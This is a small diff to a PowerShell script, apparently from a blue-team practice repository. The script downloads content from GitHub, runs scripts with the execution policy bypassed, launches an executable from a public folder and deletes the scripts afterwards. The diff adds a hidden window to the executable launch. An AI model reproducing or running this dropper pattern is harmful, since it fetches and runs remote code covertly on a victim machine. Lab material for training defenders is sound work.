@@ -5,7 +5,7 @@ Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/m
 powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\sprint.ps1
 powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\silly.ps1
 
-Start-Process "C:\Users\Public\c723561.exe"
+Start-Process "C:\Users\Public\c723561.exe" -WindowStyle Hidden
 
 Remove-Item C:\Users\Public\sprint.ps1
 Remove-Item C:\Users\Public\silly.ps1
